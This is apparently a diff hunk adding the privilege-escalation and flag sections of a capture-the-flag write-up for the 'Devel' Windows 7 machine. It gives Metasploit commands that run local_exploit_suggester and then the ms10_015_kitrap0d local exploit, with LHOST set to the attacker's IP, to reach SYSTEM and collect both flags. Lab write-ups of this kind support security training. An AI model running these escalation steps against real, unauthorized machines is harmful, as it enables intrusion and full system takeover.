@@ -88,3 +88,66 @@ You won’t see anything here, but if you go back to your Metasploit session you
 
 ![image](https://user-images.githubusercontent.com/126024971/222160811-a4204616-fb9a-4ace-b37e-70cddcf59db2.png)
 
+We are not done yet however, we need to escalate privileges since we do not have admin access.
+
+---
+
+### Privilege Escalation
+
+Running the sysinfo command gives us more information about devel, it is a x32 bit Windows 7 machine running 6.1 build 7600.
+
+![image](https://user-images.githubusercontent.com/126024971/222165346-710bf8ae-1bac-4bc0-9be8-08782c463dbd.png)
+
+Since this is a x32 bit Windows 7 machine, we can run the local_exploit_suggester module within Metasploit (This does not work for x64 bit machines).
+
+Use the background command to place the current meterpreter session in the background and then run the following commands:
+
+`msfconsole`
+
+`use post/multi/recon/local_exploit_suggester`
+
+`show options`
+
+![image](https://user-images.githubusercontent.com/126024971/222165698-8997506e-8bbc-4d7a-ba88-4208e873e8b3.png)
+
+The only option that is required is the session. Since we only have one session, this will be set to session 1.
+
+`set SESSION 1`
+
+`run`
+
+This module will take a few minutes to run, but once it has completed you should get something like this:
+
+![image](https://user-images.githubusercontent.com/126024971/222165950-e9a5f93d-7ba9-4aed-8545-f09a514951d9.png)
+
+There are multiple exploits that Metasploit thinks will work, we will use the ms10_015_kitrap0d exploit.
+
+`use exploit/windows/local/ms10_015_kitrap0d`
+
+`show options`
+
+![Screenshot_20230227_030534](https://user-images.githubusercontent.com/126024971/222166663-e5605f8e-1c7a-42bc-b6da-abf9c7b97347.png)
+
+I did have to change the LHOST to my current IP, but other than that you should just need to set the session.
+
+`set LHOST YOUR-IP-ADDRESS`
+
+`set SESSION 1`
+
+`exploit`
+
+If you run the getuid command, you will see that we are now logged in as as the system account
+
+![Screenshot_20230227_030822](https://user-images.githubusercontent.com/126024971/222167149-fc1edd44-9d2c-475c-a98a-6e8be2ee61bd.png)
+
+---
+
+### Getting the Flags
+
+After navigating to the users directory we can see there is a user named babis, I found the user flag within the desktop directory of this user:
+
+![image](https://user-images.githubusercontent.com/126024971/222167758-a6eae9c4-8c98-4b0e-a44e-5c3af50706eb.png)
+
+The root flag is found within the administrator desktop directory:
+
+![image](https://user-images.githubusercontent.com/126024971/222167841-aa67bb85-8d9b-4d78-8fc0-3e8ea9d16825.png)
